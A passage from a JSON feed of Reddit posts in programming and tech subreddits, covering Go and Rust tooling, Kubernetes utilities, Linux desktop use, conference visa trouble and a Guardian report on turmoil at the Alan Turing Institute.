time.Sleep(time.Duration(waitMillis) * time.Millisecond) } </code></pre><ul><li> – single token/request</li><li> – multiple tokens/requests</li><li>Token bucket rate limiter implementation</li></ul><p>I’d love feedback from the Go community on:</p><ul><li>Use cases where this kind of minimal limiter could shine</li><li>Benchmarks / performance scenarios you’d like to see</li><li>Any ideas for extensions (e.g., time windows, burst handling)</li></ul><p>Would really appreciate your thoughts, critiques, and suggestions!</p>","contentLength":1437,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"An opensource idea - Cloudless AI inference platform","url":"https://www.reddit.com/r/kubernetes/comments/1mtgtey/an_opensource_idea_cloudless_ai_inference_platform/","date":1755507819,"author":"/u/jwcesign","guid":231501,"unread":true,"content":"<p>At the current stage, if you want to deploy your own AI model, you will likely face the following challenges:</p><ol><li>Choosing a cloud provider and deeply integrating with it, but later finding it difficult to switch when needed.</li><li>GPU resources are scarce, and with the common architecture of deploying in a single region, you may run into issues caused by resource shortages.</li></ol><p>To address this, we aim to build an open-source Cloudless AI Inference Platform—a unified set of APIs that can deploy across any cloud, or even multiple clouds simultaneously. This platform will enable:</p><ol><li>Avoiding vendor lock-in, with smooth migration across clouds, along with a unified multi-cloud management dashboard.</li><li>Mitigating GPU resource shortages by leveraging multiple clouds.</li><li>Utilizing multi-region spot capacity to reduce costs.</li></ol><p>You may have heard of SkyPilot, but it does not address key challenges such as multi-region image synchronization and model synchronization. Our goal is to build a production-grade platform that delivers a much better cloudless AI inference experience.</p><p>We’d love to hear your thoughts on this!</p>","contentLength":1096,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Finally got WinApps to work, this tool is incredible.","url":"https://www.reddit.com/r/linux/comments/1mtg20d/finally_got_winapps_to_work_this_tool_is/","date":1755504905,"author":"/u/lapse23","guid":231504,"unread":true,"content":"<p>I've been trying to find out how to use Microsoft Office apps in Linux. Its always been a pain. I knew about WinApps but Ubuntu and Opensuse gave me lots of trouble. I recently migrated to Arch and wanted to give it a go again. </p><p>Installation process was quite smooth actually. Aside from some RDP issues(I kept using the wrong IP) it works great. It really works as advertised, runs like a native application. </p><p>I am running this on an X230 so it eats into my 8GB of RAM.</p><p>Is anyone else using WinApps? I think this should be much more popular considering the amount of people whose only reason to stick to Windows is because of Office apps.</p>","contentLength":636,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"rust-analyzer weekly releases paused in anticipation of new trait solver (already available on nightly). The Rust dev experience is starting to get really good :)","url":"https://www.reddit.com/r/rust/comments/1mtfwjf/rustanalyzer_weekly_releases_paused_in/","date":1755504320,"author":"/u/Merlindru","guid":231486,"unread":true,"content":"<blockquote><p>An Update on the Next Trait Solver We are very close to switching from chalk to the next trait solver, which will be shared with rustc.  is de-facto unmaintained, and sharing the code with the compiler will greatly improve trait solving accuracy and fix long-standing issues in rust-analyzer. This will also let us enable more on-the-fly diagnostics (currently marked as experimental), and even significantly improve performance.</p><p>However, in order to avoid regressions, we will suspend the weekly releases until the new solver is stabilized. In the meanwhile, please test the pre-release versions (nightlies) and report any issues or improvements you notice, either on <a href=\"https://github.com/rust-lang/rust-analyzer/issues\">GitHub Issues</a>, <a href=\"https://github.com/rust-lang/rust-analyzer/discussions/20426\">GitHub Discussions</a>, or <a href=\"https://rust-lang.zulipchat.com/#narrow/channel/185405-t-compiler.2Frust-analyzer/topic/New.20Trait.20Solver.20feedback\">Zulip</a>.</p></blockquote><p>The \"experimental\" diagnostics mentioned here are the ones that make r-a feel fast. </p><p>If you're used to other languages giving you warnings/errors as you type, you may have noticed r-a doesn't, which makes for an awkward and sluggish experience. Currently it offloads the responsibility of most type-related checking to , which runs after saving by default.</p><p>A while ago, r-a started implementing diagnostics for type mismatches in function calls and such. So your editor lights up immediately as you type. But these aren't enabled by default. This change will bring more of those into the stable, enabled-by-default featureset.</p><p>I have the following setup</p><ul><li>Rust nightly / r-a nightly</li></ul><p>and it honestly feels like an entirely different experience than writing rust 2 years ago. It's fast and responsive. There's still a gap to TS and Go and such, but its closing rapidly, and the contributors and maintainers have moved the DX squarely into the \"whoa, this works really well\" zone. Not to mention how hard this is with a language like Rust (traits, macros, lifetimes, are insanely hard to support)</p>","contentLength":1798,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"What are the best fuzzy search libraries available for in-memory data?","url":"https://www.reddit.com/r/golang/comments/1mtfp18/what_are_the_best_fuzzy_search_libraries/","date":1755503533,"author":"/u/reddit__is_fun","guid":231465,"unread":true,"content":"<p>I have a list of 10,000 stocks whose struct look something like this:</p><pre><code>type Stock struct { Ticker string Company string } </code></pre><p> can be AAPL, TSLA, MSFT etc. and  can be Apple, Tesla Inc., Microsoft etc.</p><p>I want to have a stock search functionality, with queries such as \"aapl\", \"tesal\", \"micor\", etc. and they should return the respective structs. Basically, not just prefix matching, it should include Levenstein distance and also both the fields need to be searched.</p><p>I can see multiple libraries for fuzzy search on Go, but not able to pin-point one for my usecase. Any help?</p>","contentLength":567,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[D] Conferences need to find better venues","url":"https://www.reddit.com/r/MachineLearning/comments/1mtfikh/d_conferences_need_to_find_better_venues/","date":1755502854,"author":"/u/AnyIce3007","guid":231461,"unread":true,"content":"<p>Better = venues that are virtually accessible for any researcher/author to go to.</p><p>Just this morning, I'm denied the U.S. B1 visa. I'm supposed to present my work at ICCV 2025 in Hawaii. And during my in-person interview, the Visa Officer did not even bother to ask for the invitation letter.</p><p>This really blows cause it's supposed to be my first time and I was so excited about attending it. Would love to hear your thoughts about this.</p>","contentLength":433,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Ubicloud: Open source alternative to AWS","url":"https://www.reddit.com/r/programming/comments/1mtfihf/ubicloud_open_source_alternative_to_aws/","date":1755502845,"author":"/u/Top-Associate-6276","guid":231503,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/Top-Associate-6276\"> /u/Top-Associate-6276 </a> <br/> <span><a href=\"https://github.com/ubicloud/ubicloud\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/programming/comments/1mtfihf/ubicloud_open_source_alternative_to_aws/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Remind you of anything? (Pro-AI vs Anti-AI)","url":"https://www.reddit.com/r/artificial/comments/1mtf9oy/remind_you_of_anything_proai_vs_antiai/","date":1755501921,"author":"/u/d41_fpflabs","guid":231558,"unread":true,"content":"<p>Back then it was anti-computers, now its anti-AI, history seems to just be repeating itself. </p>","contentLength":93,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Introducing Theta, an async actor framework for Rust","url":"https://www.reddit.com/r/rust/comments/1mtf9c5/introducing_theta_an_async_actor_framework_for/","date":1755501884,"author":"/u/Recent-Scarcity4154","guid":231745,"unread":true,"content":"<p>I'm excited to share **Theta** - a new async actor framework I've been working on that aims to be ergonomic, minimal, and performant.</p><p>There are great actor frameworks out there, but I find some points to make them better especially regarding simplicity and remote support. Here are some of the key features.</p><ul><li><ul><li>An actor instance is a very thin wrapper around a  and two MPSC channels.</li><li> is just a MPSC sender.</li></ul></li><li><ul><li>Distributed actor system powered by P2P protocol, .</li><li>Even  could be passed around network boundary as regular data in message.</li><li>Available with feature .</li></ul></li><li><ul><li>\"Monitor\" suggested by Carl Hewitt's Actor Model is implemented as (possibly remote) monitoring feature.</li><li>Available with feature .</li></ul></li><li><ul><li>Seamless respawn of actor from snapshot on file system, AWS S3 etc.</li><li>Available with feature .</li></ul></li><li><ul><li>Compile to WebAssembly for running in browser or other WASM environments</li></ul></li></ul><p>Just published  on crates.io! Would love to hear your thoughts! What features would you want to see in an actor framework?</p>","contentLength":963,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"‘Shut it down and start again’: staff disquiet as Alan Turing Institute faces identity crisis","url":"https://www.theguardian.com/technology/2025/aug/18/shut-it-down-and-start-again-staff-disquiet-as-alan-turing-institute-faces-identity-crisis","date":1755500438,"author":"/u/prisongovernor","guid":231463,"unread":true,"content":"<p>More than a decade on, Britain’s leading AI institute is in turmoil as staff warn it may be in danger of collapse and ministers demand a shift in focus to defence and security work.</p><p>“The ATI brand is well recognised internationally,” says Dame Wendy Hall, a professor of computer science at the University of Southampton and the co-chair of a 2017 government AI review. “If it ceases to be the national institute for AI and data science then we are at risk of weakening our international leadership in AI.”</p><p>Turing’s legacy, as the mathematical genius who helped crack the Enigma code, outlined <a href=\"https://www.alanturing.net/turing_archive/archive/l/l32/L32-003.html\" data-link-name=\"in body link\">key concepts of AI</a> and <a href=\"https://www.theguardian.com/technology/2014/jun/09/what-is-the-alan-turing-test\" data-link-name=\"in body link\">invented the eponymous test</a> to discern whether a computer can show human intelligence, has been rebuilt and burnished in recent years.</p><p>The complaint raised eight points of concern including the possibility that £100m of government funding might be withdrawn, which “could lead to the Institute’s collapse”.</p><p>“These concerns are so significant that many staff now believe the institute’s charitable status and public credibility are at risk,” said the complaint, which also raised concerns about internal governance and culture as well as oversight of spending.</p><p>It is the latest in a series of staff broadsides at management. In March last year more than 180 staff <a href=\"https://www.theguardian.com/science/2024/mar/11/staff-at-alan-turing-institute-speak-out-after-four-men-given-top-roles\" data-link-name=\"in body link\">wrote a letter to leadership</a> expressing “serious concerns” about the organisation’s approach to diversity after it appointed four men to senior roles. In December <a href=\"https://www.theguardian.com/technology/2024/dec/11/redundancies-would-put-alan-turing-institute-at-risk-staff-say\" data-link-name=\"in body link\">more than 90 staff warned in another letter</a> that ATI’s credibility was in “serious jeopardy” amid a restructuring that was threatening jobs – and research projects.</p><p>ATI has recently notified about 50 staff – or approximately 10% of its workforce – that they are at risk of redundancy and is shutting down projects related to online safety, tackling the housing crisis and reducing health inequality.</p><p>This is part of an overhaul dubbed Turing 2.0 under which the institute will focus on three key areas: health, the environment, and defence and security.</p><p>A recent letter from the UK technology secretary, <a href=\"https://www.theguardian.com/politics/peter-kyle\" data-link-name=\"in body link\" data-component=\"auto-linked-tag\">Peter Kyle</a>, has made clear the overhaul does not go far enough. Writing to ATI’s chair last month, Kyle demanded the institute switch its main focus to defence and security, adding that ATI’s “longer-term funding arrangement” could be reviewed next year.</p><p>“Moving forward, defence and national security projects should form a core of ATI’s activities, and relationships with the UK’s security, defence, and intelligence communities should be strengthened accordingly,” Kyle wrote.</p><p>He also indicated that leadership changes might be needed.</p><p>“To realise this vision, it is imperative that the ATI’s leadership reflects the institute’s reformed focus,” he wrote. “Careful consideration should be given to the importance of an executive team who possesses a relevant background and sector knowledge to lead this transition.”</p><p>It is against this backdrop – long-running staff dissatisfaction with leadership, a strategic and financial overhaul, and then a bombshell from the government – that the whistleblower complaint was filed.</p><p>Gurr responded to Kyle last month with a letter pledging to “step up” on defence and national security as well as boosting the UK’s self-sufficiency in AI – or “sovereign capabilities”.</p><p>“We will step up at a time of national need,” Gurr wrote.</p><p>However, Gurr added that ATI will “continue to drive forward high-impact work in environment and healthcare” where it fits with the “government’s missions and the interests of our philanthropic and private funders”.</p><p>At a recent meeting between staff and ATI leadership, held remotely, Gurr faced pointed questions about the new direction raised by Kyle and the institute’s restructuring. One attender said the atmosphere was difficult, describing the mood among the more than 100 employees during the meeting as “contemptuous throughout”.</p><p>In an internal note to staff this week, Innes and Gurr confirmed a new working group of government officials and ATI staff had met to discuss the new direction. It also confirmed people would be leaving through redundancies and non-renewal of contracts.</p><p>ATI’s goals include to “advance world-class research and apply it to national and global challenges”, as well as driving an “informed public conversation” on AI. Its five founding UK universities were Cambridge, Oxford, Edinburgh, UCL and Warwick, with its research work including teaming up with the Met Office to <a href=\"https://www.turing.ac.uk/research/research-projects/fastnet\" data-link-name=\"in body link\">improve weather forecasting</a>, creating <a href=\"https://www.turing.ac.uk/news/thousands-cardiac-digital-twins-offer-new-insights-heart\" data-link-name=\"in body link\">cardiac “digital twins”</a> to study heart disease and <a href=\"https://www.turing.ac.uk/research/research-programmes/project-bluebird\" data-link-name=\"in body link\">improving air traffic control</a>.</p><p>A source who worked in the previous Conservative government said Labour’s concerns about the institute are “far from new” and there had been disquiet in political circles about the institute’s performance for some time, with multiple university stakeholders blurring its focus.</p><p>In that context, the source said, it makes sense to double down on what the institute does well – defence and security – or “just shut it down and start again”.</p><p>Prof Jon Crowcroft, the Marconi professor of communication systems at the University of Cambridge’s Computer Lab, and an adviser to Innes, says the institute’s staff have become unsettled.</p><p>“I think the crisis in terms of people is real. A lot of people are still there because they believe it’s a good, open institution doing valuable public work. But they’re also wondering where their job is going to be,” he says.</p><p>He adds: “I have not seen a plan A for keeping all the staff happy, which would mean keeping some non-defence and security projects. The reason why staff have issued these letters is because they have not seen that.”</p><p>Referring to ATI’s base at the British Library in London, he says: “Nor have I seen a plan B for what happens if too many people leave, because so many projects have gone, which means the core funding is not viable and they cannot justify the size of the building they are in.”</p><p>There are “mixed views” on the looming shift to defence and security, according to a current staff member who says they have listened to a “diverse” array of concerns among colleagues.</p><p>“We understand the national importance issue. Very few of us are saying that work shouldn’t happen. But we think a singular focus would be too narrow. Turing’s strength comes from applying AI to a wide range of societal challenges, from health to the environment, with responsible innovation at the heart.”</p><p>The staff member adds: “Those areas are still important, and with the right leadership we could fulfil the vision and purpose that brought us here in the first place.”</p><p>The staff member adds that Gurr’s letter pledging to double down on defence and security, while still working on health and environment, leaves ATI in a “precarious standoff” with government.</p><p>“The leadership is hoping the government’s attention, or its personnel, shifts,” they said. Hall says the institute has no choice but to change.</p><p>“Clearly there is not much money around and the institute needs to do what the government asks. If it doesn’t, then presumably the government will close it down.”</p><p>She adds: “The institute has ceased to be what it was initially set up to be, which was a national institute for data science and AI. The government has asked it to focus on defence and security. Whether the UK needs such an institute is for the government to decide. Personally I would like to see the justification.”</p><p>Crowcroft, who defends the quality of the institute’s work, says the UK has always been strong in AI and is “probably now stronger still”, pointing to multiple generations of AI expertise produced by universities such as Cambridge, Oxford, Imperial College and Edinburgh as well as the success of London-based Google DeepMind and the establishment of UK-based AI units by leading US tech firms such as Microsoft and OpenAI.</p><p>A spokesperson for ATI said the institute was going through “substantial” change to continue to deliver in its unique role as the UK’s national institute for data science and AI.</p><p>“As we move forward, we’re focused on delivering real-world impact across society’s biggest challenges, including responding to the national need to double down on our work in defence, national security and sovereign capabilities.”</p><p>A government spokesperson said the technology secretary wants ATI to show value for money for taxpayer, which can be achieved by “giving the institute a key role in safeguarding our national security and positioning it where the British public expects it to be”.</p><p>Turing’s legacy will live on. But in terms of the institute that bears his name, its longevity is in doubt.</p>","contentLength":8770,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/artificial/comments/1mtevfo/shut_it_down_and_start_again_staff_disquiet_as/"},{"title":"[D] How to get into High Dimensional Dynamical Systems?","url":"https://www.reddit.com/r/MachineLearning/comments/1mtdjum/d_how_to_get_into_high_dimensional_dynamical/","date":1755495691,"author":"/u/Mad_Scientist2027","guid":231747,"unread":true,"content":"<p>Title. Also, what all areas can I hope to conduct research in? I'm a bit new to the field, and wanted to know what all it entailed before proceeding.</p><p>Any responses / suggestions are appreciated. Thanks in advance.</p>","contentLength":212,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Recaller: A fast, Go based command-line tool to recall your shell history with absolute precision & refer documentation","url":"https://www.reddit.com/r/golang/comments/1mtdf9n/recaller_a_fast_go_based_commandline_tool_to/","date":1755495233,"author":"/u/Turbulent_One4722","guid":231447,"unread":true,"content":"<p>Hi, community, we are open-sourcing a Go terminal application called **Recaller App** that fetches command history based on your actions.</p><p>Recaller suggests shell history (bash, zsh) based on recency &amp; frequency making things more relevant for you. It also provides documentation to various types of commands (K8s, Docker, Linux man pages, AWS CLI etc.) instantly for options reference and learning.</p><p>Combined with a fuzzer like `fzf`, curated history shows up right in the shell. App is &lt; 5 MB in size, and runs locally. The tool uses optimization techniques (AVL-trees &amp; Caching) to achieve its lookup speeds, so maybe interesting for few Go enthusiasts.</p><p>Any feedback on the project is very much appreciated</p>","contentLength":704,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Etcd Database Defragmentation","url":"https://www.reddit.com/r/kubernetes/comments/1mtd8ys/etcd_database_defragmentation/","date":1755494607,"author":"/u/FlatwormStunning9931","guid":231445,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>If the etcd Database fragmentation percentage is proceeding in one direction that is increasing . Will it eventually render etcd to readonly. Do we have that reference/article handy? </p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/FlatwormStunning9931\"> /u/FlatwormStunning9931 </a> <br/> <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1mtd8ys/etcd_database_defragmentation/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1mtd8ys/etcd_database_defragmentation/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"I installed Linux Mint on my grandmother's brand new laptop (she asked me to)","url":"https://www.reddit.com/r/linux/comments/1mtcb4p/i_installed_linux_mint_on_my_grandmothers_brand/","date":1755491441,"author":"/u/nakina4","guid":231462,"unread":true,"content":"<p>My grandma recently bought a new laptop and when I was helping her set it up, I ran into a problem. Since Windows 11 likes to force you to make a Microsoft account nowadays, I had her give me an email address and password she wanted to use to make her account. The problem arose when I put her email address in and it got rejected. She uses a local ISP email address and it's been fine for everything else she uses. Microsoft wouldn't allow it in this case however and suggested creating a new email. Well of course she doesn't want to do that. I explained the options to her: I could override this and make a local account with some fiddling, we could make a new email, or I could install Linux.</p><p>My grandmother, who is in her 70's asked me to just install Linux. I've put Linux Mint on an older laptop of hers to squeeze some extra life out of it before and I guess she really enjoyed using it. So today I installed Linux Mint on her brand new laptop before even finishing the first boot of Windows 11. I just thought this was kind of amusing and wanted to share, I never thought I'd see the day where she'd actually choose Linux over Windows. </p>","contentLength":1144,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Any RPC frameworks I can learn?","url":"https://www.reddit.com/r/golang/comments/1mtbnyk/any_rpc_frameworks_i_can_learn/","date":1755489422,"author":"/u/Efficient_Clock2417","guid":231420,"unread":true,"content":"<div><p>I have been learning Golang, along with 2 RPC frameworks so far: - gRPC (with Protobuf) - Cap’n Proto (which is a bit more challenging given there is only some documentation here and there)</p><p>Are there any other RPC frameworks that you think I should learn as I continue learning Golang?</p></div>   submitted by   <a href=\"https://www.reddit.com/user/Efficient_Clock2417\"> /u/Efficient_Clock2417 </a>","contentLength":328,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"AI Infra Learning path","url":"https://www.reddit.com/r/kubernetes/comments/1mtaqfy/ai_infra_learning_path/","date":1755486601,"author":"/u/Electronic_Role_5981","guid":231418,"unread":true,"content":"<table> <tr><td> <a href=\"https://www.reddit.com/r/kubernetes/comments/1mtaqfy/ai_infra_learning_path/\"> <img src=\"https://external-preview.redd.it/iA2rHkTfVCCtA-cgTBnUeYqHPVfy5YhnBtrOgcPPZ9o.png?width=640&amp;crop=smart&amp;auto=webp&amp;s=951d5e946b010c5457be1d4eea4f9bc1d3d7f5e5\" alt=\"AI Infra Learning path\" title=\"AI Infra Learning path\" /> </a> </td><td> <!-- SC_OFF --><div class=\"md\"><p>I started to learn about AI-Infra projects and summarized it in <a href=\"https://github.com/pacoxu/AI-Infra\">https://github.com/pacoxu/AI-Infra</a>.</p> <p><a href=\"https://preview.redd.it/doy1jgo32pjf1.png?width=1211&amp;format=png&amp;auto=webp&amp;s=92313103ff84a0b161c4741da4e94720cc7d38db\">https://preview.redd.it/doy1jgo32pjf1.png?width=1211&amp;format=png&amp;auto=webp&amp;s=92313103ff84a0b161c4741da4e94720cc7d38db</a></p> <p>The upper‑left section of the second quadrant is where the focus of learning should be.</p> <ul> <li>llm-d</li> <li>dynamo</li> <li>vllm/AIBrix</li> <li>vllm production stack</li> <li>sglang/ome</li> <li>llmaz</li> </ul> <p>Or KServe.</p> <p>A hot topic about Inference is pd-disagregation.</p> <p>Collect more resources in <a href=\"https://github.com/pacoxu/AI-Infra/issues/8\">https://github.com/pacoxu/AI-Infra/issues/8</a>. </p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/Electronic_Role_5981\"> /u/Electronic_Role_5981 </a> <br/> <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1mtaqfy/ai_infra_learning_path/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1mtaqfy/ai_infra_learning_path/\">[comments]</a></span> </td></tr></table>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"How I went from hating DI frameworks to building one for my 50k LOC Go API","url":"https://www.reddit.com/r/golang/comments/1mt9clj/how_i_went_from_hating_di_frameworks_to_building/","date":1755482589,"author":"/u/ameryono","guid":231621,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>Hey <a href=\"/r/golang\">r/golang</a>,</p> <p>I know, I know… &quot;Go doesn&#39;t need DI frameworks.&quot; I said the same thing for years. Then my startup&#39;s API grew to 30+ services, and I was spending more time wiring dependencies than writing features.</p> <p>Every new feature looked like: update 5 constructors, fix 10 test files, debug ordering issues, realize I forgot to pass the logger somewhere, start over. Sound familiar?</p> <p>So I built godi to solve actual problems I was hitting every day.</p> <p>My main.go was 100 lines of this:</p> <pre><code>config := loadConfig() logger := newLogger(config) db := newDatabase(config, logger) cache := newCache(config, logger) userRepo := newUserRepo(db, logger) orderRepo := newOrderRepo(db, logger) emailService := newEmailService(config, logger) userService := newUserService(userRepo, emailService, cache, logger) orderService := newOrderService(orderRepo, userService, emailService, cache, logger) // ... many more services </code></pre> <p>Want to add caching? Time to update 20 constructors, their tests, and hope you got the initialization order right.</p> <p>With godi, it&#39;s just:</p> <pre><code>services := godi.NewCollection() services.AddSingleton(loadConfig) services.AddSingleton(newLogger) services.AddSingleton(newDatabase) services.AddScoped(newUserService) services.AddScoped(newOrderService) // Order doesn&#39;t matter - godi figures it out provider, _ := services.Build() orderService, _ := godi.Resolve[*OrderService](provider) // Everything wired automatically </code></pre> <h1>The game changer: Three lifetime scopes</h1> <p>This is what actually makes it powerful:</p> <pre><code>services.AddSingleton(NewDatabase) // One instance forever services.AddScoped(NewUserContext) // New instance per request services.AddTransient(NewRequestID) // New instance every time </code></pre> <p>In practice:</p> <pre><code>http.HandleFunc(&quot;/users&quot;, func(w http.ResponseWriter, r *http.Request) { scope, _ := provider.CreateScope(r.Context()) defer scope.Close() // Every service in THIS request shares the same UserContext // Next request gets fresh instances userService, _ := godi.Resolve[*UserService](scope) }) </code></pre> <p>No more threading context through 15 function calls. No more globals. Each request gets its own isolated world.</p> <h1>Your code doesn&#39;t change</h1> <pre><code>func NewOrderService( repo OrderRepository, users UserService, email EmailService, ) OrderService { return &amp;orderService{repo, users, email} } </code></pre> <p>Just regular constructors. No tags, no magic. Add a parameter? godi automatically injects it everywhere.</p> <h1>Modules keep it organized</h1> <pre><code>var RepositoryModule = godi.NewModule(&quot;repository&quot;, godi.AddScoped(NewUserRepository), godi.AddScoped(NewUserService), ) services.AddModules(RepositoryModule) // Pull in everything </code></pre> <h1>Is this for you?</h1> <p>You don&#39;t need this for a 10 file project. But when you have 30+ services, complex dependency graphs, and need request isolation for web APIs? Manual wiring becomes a nightmare.</p> <p>Using this in production on a ~50k LOC codebase. Adding new services went from &quot;ugh, wiring&quot; to just writing the constructor.</p> <p>Would love to hear how others handle dependency injection at scale. Are you all just more disciplined than me with manual wiring? Using wire? Rolling your own factories? And if you try godi, let me know what sucks. Still actively working on it.</p> <p><strong>Github:</strong> <a href=\"https://github.com/junioryono/godi\">github.com/junioryono/godi</a></p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/ameryono\"> /u/ameryono </a> <br/> <span><a href=\"https://www.reddit.com/r/golang/comments/1mt9clj/how_i_went_from_hating_di_frameworks_to_building/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/golang/comments/1mt9clj/how_i_went_from_hating_di_frameworks_to_building/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"NUMA Is the New Network: How Per-Socket Memory Models Are Reshaping Microservice Placement","url":"https://www.reddit.com/r/programming/comments/1mt8qjj/numa_is_the_new_network_how_persocket_memory/","date":1755480863,"author":"/u/mqian41","guid":231446,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>Explores how Non-Uniform Memory Access (NUMA) is reshaping microservice placement.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/mqian41\"> /u/mqian41 </a> <br/> <span><a href=\"https://codemia.io/blog/path/NUMA-Is-the-New-Network-How-Per-Socket-Memory-Models-Are-Reshaping-Microservice-Placement\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/programming/comments/1mt8qjj/numa_is_the_new_network_how_persocket_memory/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Documenting Code is boring ….but it doesn’t have to be","url":"https://www.reddit.com/r/programming/comments/1mt6zy1/documenting_code_is_boring_but_it_doesnt_have_to/","date":1755475969,"author":"/u/Ok-Ad7050","guid":230761,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>This article got me thinking about the fundamental paradox in our industry - we all desperately need good documentation, but most of us hate creating it. The piece talks about making docs “less boring” through better design and structure, but I’m more curious about the underlying problem: is the pain of writing documentation actually worth solving, or do most developers just accept it as a necessary evil? In my experience, there are roughly three camps: 1. The sufferers - Write docs because they have to, hate every minute of it 2. The skippers - Just don’t document and hope someone else deals with it later 3. The rare unicorns - Actually enjoy writing documentation (do these people exist?) What’s your honest approach? Do you: • Power through the tedium because you know it’s important? • Use any tools/automation to make it less painful? • Just… not do it unless absolutely forced? I’m particularly interested in whether people think this is a problem worth solving with better tooling, or if it’s just an inherent part of development that we need to accept.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/Ok-Ad7050\"> /u/Ok-Ad7050 </a> <br/> <span><a href=\"https://medium.com/steeple-product/how-to-make-documentation-less-boring-ea50fcfa56fb\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/programming/comments/1mt6zy1/documenting_code_is_boring_but_it_doesnt_have_to/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Event-driven port forwarding with Kubernetes watchers in kftray v0.21.0","url":"https://www.reddit.com/r/kubernetes/comments/1mt53vo/eventdriven_port_forwarding_with_kubernetes/","date":1755470884,"author":"/u/Beginning_Dot_1310","guid":230708,"unread":true,"content":"<table> <tr><td> <a href=\"https://www.reddit.com/r/kubernetes/comments/1mt53vo/eventdriven_port_forwarding_with_kubernetes/\"> <img src=\"https://external-preview.redd.it/rj_iE4ZF4wNSaUFEdY-oQD8WAKQRKxRVmBKPgUD72Cc.png?width=640&amp;crop=smart&amp;auto=webp&amp;s=f087a0ad179447105fa9e0f4d6085d55819b4f52\" alt=\"Event-driven port forwarding with Kubernetes watchers in kftray v0.21.0\" title=\"Event-driven port forwarding with Kubernetes watchers in kftray v0.21.0\" /> </a> </td><td> <!-- SC_OFF --><div class=\"md\"><p><span class=\"md-spoiler-text\"><em>for anyone who doesn&#39;t know, kftray is a OSS cross-platform system tray app and terminal ui for managing kubectl port-forward commands. it helps you start, stop, and organize multiple port forwards without typing kubectl commands repeatedly. works on mac, windows, and linux.</em></span></p> <p>Rewrote the port forwarding engine was changed from polling to using the Kubernetes watch API instead of checking the pod status every time there is a connection.</p> <p>Made a demo comparing kubectl vs kftray when deleting all pods while port forwarding. kubectl dies completely, kftray loses maybe one request and keeps going. Port forwards now actually survive pod restarts.</p> <p>Made a bunch of stuff faster:</p> <ul> <li><strong>Prewarmed connections</strong> - connections stay ready for traffic instead of being created on demand</li> <li><strong>Network recovery</strong> - waits for the network to stabilize before reconnecting, no more connection spam during blips</li> <li><strong>Client caching</strong> - reuses Kubernetes connections instead of creating new ones constantly</li> </ul> <p><strong>Blog post:</strong> <a href=\"https://kftray.app/blog/posts/14-kftray-v0-21-updates\">https://kftray.app/blog/posts/14-kftray-v0-21-updates</a><br/> <strong>Release Notes:</strong> <a href=\"https://github.com/hcavarsan/kftray/releases/tag/v0.21.0\">https://github.com/hcavarsan/kftray/releases/tag/v0.21.0</a><br/> <strong>Downloads:</strong> <a href=\"https://kftray.app/downloads\">https://kftray.app/downloads</a></p> <p>If you find it useful, a star on github would be great! <a href=\"https://github.com/hcavarsan/kftray\">https://github.com/hcavarsan/kftray</a></p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/Beginning_Dot_1310\"> /u/Beginning_Dot_1310 </a> <br/> <span><a href=\"https://kftray.app/blog/posts/14-kftray-v0-21-updates\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1mt53vo/eventdriven_port_forwarding_with_kubernetes/\">[comments]</a></span> </td></tr></table>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"A business card that's also an embedded device with LED display running a fluid simulation, written in Rust","url":"https://github.com/Nicholas-L-Johnson/flip-card","date":1755469764,"author":"/u/kibwen","guid":230759,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/rust/comments/1mt4o50/a_business_card_thats_also_an_embedded_device/"},{"title":"Embedded Go as a toolchain, Pi Pico 